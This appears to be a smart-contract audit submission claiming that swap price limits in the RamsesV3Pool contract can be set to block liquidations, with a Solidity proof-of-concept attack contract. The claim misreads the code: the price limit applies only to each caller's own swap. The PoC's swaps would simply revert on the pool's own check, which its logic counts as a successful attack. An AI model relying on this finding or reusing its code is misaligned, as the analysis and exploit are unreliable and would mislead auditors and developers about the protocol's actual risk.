# Vulnerability details

**Title**: Ability to Manipulate Price Limits to Prevent Liquidations

**Description**:
In the RamsesV3Pool contract, there's a mechanism that allows for setting price limits. This could potentially be exploited to prevent liquidations or manipulate the pool's behavior in extreme market conditions.

**Vulnerable Code**:
```solidity
function swap(
    address recipient,
    bool zeroForOne,
    int256 amountSpecified,
    uint160 sqrtPriceLimitX96,
    bytes calldata data
) external override returns (int256 amount0, int256 amount1) {
    // ... (other code)
    
    // Price limit check
    if (zeroForOne) {
        if (sqrtPriceLimitX96 > $.slot0.sqrtPriceX96) revert SPL();
    } else {
        if (sqrtPriceLimitX96 < $.slot0.sqrtPriceX96) revert SPL();
    }
    
    // ... (swap logic)
}
```

**Impact**:
1. A malicious actor could set extreme price limits to prevent swaps or liquidations from occurring.
2. This could lead to the pool becoming stuck in an unfavorable state, potentially causing losses for liquidity providers.
3. In extreme market conditions, this could be used to prevent necessary rebalancing or liquidations, leading to increased risk for the protocol.

**Proof of Concept**:
1. An attacker monitors the pool for signs of impending liquidation or large swaps.
2. Just before such an event, they perform a transaction that sets an extreme price limit.
3. Subsequent attempts to perform large swaps or liquidations fail due to the price limit check.

Here is just an example of the proof of concept

``` solidity

import "./RamsesV3Pool.sol";
import "./IERC20.sol";

contract PriceManipulationPoC {
    RamsesV3Pool public pool;
    IERC20 public token0;
    IERC20 public token1;

    constructor(address _pool, address _token0, address _token1) {
        pool = RamsesV3Pool(_pool);
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
    }

    function manipulatePrice() external {
        // Approve tokens for the pool
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);

        // Get current price
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();

        // Calculate an extreme price limit
        uint160 extremePriceLimit = type(uint160).max;

        // Perform a swap with the extreme price limit
        pool.swap(
            address(this),
            true, // zeroForOne
            1000000, // amountSpecified (large amount)
            extremePriceLimit,
            "" // empty data
        );
    }

    function preventLiquidation() external {
        // Simulate a liquidation attempt
        try pool.swap(
            address(this),
            false, // oneForZero (opposite direction of manipulation)
            1000000, // amountSpecified
            0, // no price limit
            "" // empty data
        ) {
            revert("Liquidation should have failed");
        } catch {
            console.log("Liquidation prevented successfully");
        }
    }

    // Callback function for swap
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        // Handle the callback (transfer tokens if needed)
        if (amount0Delta > 0) {
            token0.transfer(address(pool), uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            token1.transfer(address(pool), uint256(amount1Delta));
        }
    }
}


```

**Recommendation**:
1. Implement bounds on allowable price limits to prevent extreme values.
2. Consider adding a time delay or governance mechanism for significant changes to price limits.
3. Implement a fallback mechanism that allows for overriding extreme price limits in emergency situations.
